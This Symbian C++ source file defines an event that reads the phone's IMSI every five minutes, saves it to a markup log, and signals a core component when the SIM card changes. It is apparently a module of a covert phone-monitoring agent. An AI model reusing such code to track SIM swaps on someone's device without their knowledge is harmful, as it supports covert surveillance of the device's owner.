/*
 * EventSimChange.cpp
 *
 *  Created on: 02/ott/2010
 *      Author: Giovanna
 */

#ifndef EVENTSIMCHANGE_CPP_
#define EVENTSIMCHANGE_CPP_

#include "EventSimChange.h"

CEventSimChange::CEventSimChange(TUint32 aTriggerId) :
	CAbstractEvent(EEvent_Sim_Change, aTriggerId),iSecondsInterv(300)
	{
	// No implementation required
	}

CEventSimChange::~CEventSimChange()
	{
	//__FLOG(_L("Destructor"));
	delete iTimer;
	delete iPhone;
	delete iLogFile;
	iFs.Close();
	//__FLOG(_L("End Destructor"));
	//__FLOG_CLOSE;
	}

CEventSimChange* CEventSimChange::NewLC(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventSimChange* self = new (ELeave) CEventSimChange(aTriggerId);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CEventSimChange* CEventSimChange::NewL(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventSimChange* self = CEventSimChange::NewLC(params, aTriggerId);
	CleanupStack::Pop(); // self;
	return self;
	}
 
void CEventSimChange::ConstructL(const TDesC8& params)
	{
	//__FLOG_OPEN_ID("HT", "EventTimer.txt");
	//__FLOG(_L("-------------"));
	
	// This event has no parameters
	BaseConstructL(params);
	
	User::LeaveIfError(iFs.Connect());
	iLogFile = CLogFile::NewL(iFs);
	iPhone = CPhone::NewL();
	iTimer = CTimeOutTimer::NewL(*this);		
	}

void CEventSimChange::StartEventL()
	{
	// get IMSI
	TBuf<CTelephony::KIMSISize> imsi;
	iPhone->GetImsiSync(imsi);
	if(imsi.Size()>0)
		{
		TBuf8<CTelephony::KIMSISize> imsi8;
		imsi8.Copy(imsi);
			
		// check markup 
		if(!iLogFile->ExistsMarkupL(Type()))
			{
			// markup !exist, create
			HBufC8* tmp = GetImsiBufferL(imsi8);
			CleanupStack::PushL(tmp);
			iLogFile->WriteMarkupL(Type(),*tmp);
			CleanupStack::PopAndDestroy(tmp);
			}
		else
			{
			// markup exists, read
			RBuf8 markupBuffer(iLogFile->ReadMarkupL(Type()));
			markupBuffer.CleanupClosePushL();
			TBuf8<CTelephony::KIMSISize> savedImsi;
			savedImsi.Copy(markupBuffer);
			CleanupStack::PopAndDestroy(&markupBuffer);		
			// compare and, if the case, trigger action and write new markup
			if(imsi8.Compare(savedImsi)!=0)
				{
				//new IMSI
				HBufC8* tmp = GetImsiBufferL(imsi8);
				CleanupStack::PushL(tmp);
				iLogFile->WriteMarkupL(Type(),*tmp);
				CleanupStack::PopAndDestroy(tmp);
				SendActionTriggerToCoreL();
				}
			}
		}
	// start timer for polling
	iTimeAt.HomeTime();
	iTimeAt += iSecondsInterv;
	iTimer->At(iTimeAt);
	}



void CEventSimChange::TimerExpiredL(TAny* )
	{
	// get IMSI
	TBuf<CTelephony::KIMSISize> imsi;
	iPhone->GetImsiSync(imsi);
	if(imsi.Size()>0)
		{
		TBuf8<CTelephony::KIMSISize> imsi8;
		imsi8.Copy(imsi);
		
		// check markup 
		if(!iLogFile->ExistsMarkupL(Type()))
			{
			// markup !exist, create
			HBufC8* tmp = GetImsiBufferL(imsi8);
			CleanupStack::PushL(tmp);
			iLogFile->WriteMarkupL(Type(),*tmp);
			CleanupStack::PopAndDestroy(tmp);
			}
		else
			{
			// markup exists, read
			RBuf8 markupBuffer(iLogFile->ReadMarkupL(Type()));
			markupBuffer.CleanupClosePushL();
			TBuf8<CTelephony::KIMSISize> savedImsi;
			savedImsi.Copy(markupBuffer);
			CleanupStack::PopAndDestroy(&markupBuffer);		
			// compare and, if the case, trigger action and write new markup
			if(imsi8.Compare(savedImsi)!=0)
				{
				//new IMSI
				HBufC8* tmp = GetImsiBufferL(imsi8);
				CleanupStack::PushL(tmp);
				iLogFile->WriteMarkupL(Type(),*tmp);
				CleanupStack::PopAndDestroy(tmp);
				SendActionTriggerToCoreL();
				}
			}
		}	
	iTimeAt.HomeTime();
	iTimeAt += iSecondsInterv;
	iTimer->At(iTimeAt);
	}

HBufC8* CEventSimChange::GetImsiBufferL(const TDesC8& aImsi)
{
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	
	TUint32 len = sizeof(len) + aImsi.Size();
	buffer->InsertL(buffer->Size(), &len, sizeof(len));
	buffer->InsertL(buffer->Size(), aImsi.Ptr(), aImsi.Size());

	HBufC8* result = buffer->Ptr(0).AllocL();
	CleanupStack::PopAndDestroy(buffer);
	return result;
}


#endif /* EVENTSIMCHANGE_CPP_ */
